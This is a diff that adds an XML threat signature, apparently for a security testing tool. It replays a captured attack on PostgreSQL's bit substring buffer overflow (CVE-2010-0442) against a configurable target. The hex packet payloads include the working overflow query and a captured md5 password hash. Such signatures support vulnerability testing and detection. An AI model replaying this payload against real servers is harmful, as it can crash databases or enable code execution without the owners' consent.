@@ -1,0 +1,129 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="PostgreSQL Bit Substring Buffer Overflow"/>
+    <EngDesc display="true" value="A buffer overflow vulnerability exists in the PostgreSQL database server. The vulnerability is due to an error when executing the SQL substring function with malicious input. A remote authenticated attacker could leverage this vulnerability by sending a crafted SQL query to a target server. Successful exploitation could lead to the execution of arbitrary code on the target server, in this scenario the behaviour of the target server would depend entirely on the intention of the malicious code. In situation where code execution is not successful, the target server could terminate abnormally, resulting in a denial of service condition."/>
+    <Intent display="true">
+      <item value="Code_Execution/Buffer_Overflow"/>
+    </Intent>
+    <Protocol display="true" value="PostgreSQL"/>
+    <Type_Of_Equipment display="true">
+      <item value="Database_Server"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="Postgresql.org"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="PostgreSQL_PostgreSQL"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="PostgreSQL_PostgreSQL_8"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value=""/>
+    <CVEID display="true" value="CVE-2010-0442"/>
+    <bugtraqID display="true" value=""/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value=""/>
+    <ID display="true" value="b54bec5d067df0400d766b653f17ed13"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value=""/>
+    <ServerSideAttack display="true" value=""/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value=""/>
+    <Valid_Traffic display="false" value=""/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="medium"/>
+    <Authentication display="false" value="required"/>
+    <ConfImpact display="false" value="partial"/>
+    <IntegImpact display="false" value="partial"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value=""/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="634033118668152481"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value="TCP"/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1269003713" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="P"/>
+    <NamedVar name="PGSQLdestPort" type="ImperfectControls.Port" value="null" index="Q"/>
+  </Variables>
+  <Loops>
+    <for index="D">
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="I">
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="J">
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="K">
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="L">
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+    <for index="M">
+      <for index="P"/>
+      <for index="Q"/>
+    </for>
+  </Loops>
+  <PostScript/>
+  <Output index="D" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8D:42:25" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="003C" Identification="33E0" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A54D" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="47964" destPort="$PGSQLdestPort" SeqNumber="C00C351E" AckNumber="C22660E4" HeaderLength="08" WindowSize="002E" Checksum="CE34" UrgentPointer="0000" Options="0101080A2AD106C400F7105C" Payload="0000000804D2162F" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="J" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8D:42:25" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="005D" Identification="33E3" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A529" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="47964" destPort="$PGSQLdestPort" SeqNumber="C00C354D" AckNumber="C22660F2" HeaderLength="08" WindowSize="002E" Checksum="7833" UrgentPointer="0000" Options="0101080A2AD106C600F71061" Payload="70000000286D6435653638613834363462383530323661653932353663303639393236616162643600" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Output index="L" Count="">
+    <Ethernet srcMac="00:1B:78:75:79:68" destMac="00:0C:29:8D:42:25" pktType="0800">
+      <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0091" Identification="33E4" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="A4F4" srcIP="172.16.1.2" destIP="$destIP" options="" CE="false" DF="true" MF="false">
+        <TCP srcPort="47964" destPort="$PGSQLdestPort" SeqNumber="C00C3576" AckNumber="C2266209" HeaderLength="08" WindowSize="0036" Checksum="1B80" UrgentPointer="0000" Options="0101080A2AD106C800F71068" Payload="510000005C73656C65637420737562737472696E672842273130313031303130313031303130313031303130313031303130313031303130313031303130313031303130313031303130313031303130313031272C32352C2D32302900" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1,3,5">
+    <Output index="I" Count="">
+      <Ethernet srcMac="00:0C:29:8D:42:25" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0041" Identification="70BB" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="686D" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$PGSQLdestPort" destPort="47964" SeqNumber="C22660E5" AckNumber="C00C354D" HeaderLength="08" WindowSize="016A" Checksum="4FDB" UrgentPointer="0000" Options="0101080A00F710612AD106C5" Payload="520000000C000000050EF0DC44" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="K" Count="">
+      <Ethernet srcMac="00:0C:29:8D:42:25" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="014B" Identification="70BC" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6762" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$PGSQLdestPort" destPort="47964" SeqNumber="C22660F2" AckNumber="C00C3576" HeaderLength="08" WindowSize="016A" Checksum="D48B" UrgentPointer="0000" Options="0101080A00F710682AD106C6" Payload="5200000008000000005300000019636C69656E745F656E636F64696E670055544638005300000017446174655374796C650049534F2C204D445900530000001A696E74656765725F6461746574696D6573006F666600530000001569735F737570657275736572006F66660053000000197365727665725F656E636F64696E67005554463800530000001A7365727665725F76657273696F6E00382E312E313100530000002073657373696F6E5F617574686F72697A6174696F6E0074656C75730053000000247374616E646172645F636F6E666F726D696E675F737472696E6773006F666600530000001C54696D655A6F6E650043616E6164612F4561737465726E004B0000000C00004CD33D4391135A0000000549" CWR="false" ECE="false" URG="false" ACK="true" PSH="true" RST="false" SYN="false" FIN="false" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+    <Output index="M" Count="">
+      <Ethernet srcMac="00:0C:29:8D:42:25" destMac="00:1B:78:75:79:68" pktType="0800">
+        <IP Version="04" InternetHeaderLength="05" TypeofService="00" TotalLength="0034" Identification="70BD" FragmentOffset="0000" TTL="40" Protocol="06" HeaderChecksum="6878" srcIP="$destIP" destIP="172.16.1.2" options="" CE="false" DF="true" MF="false">
+          <TCP srcPort="$PGSQLdestPort" destPort="47964" SeqNumber="C2266209" AckNumber="C00C35D3" HeaderLength="08" WindowSize="016A" Checksum="E61F" UrgentPointer="0000" Options="0101080A00F7106F2AD106C8" Payload="" CWR="false" ECE="false" URG="false" ACK="true" PSH="false" RST="false" SYN="false" FIN="true" RES1="false" RES2="false" RES3="false" RES4="false"/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
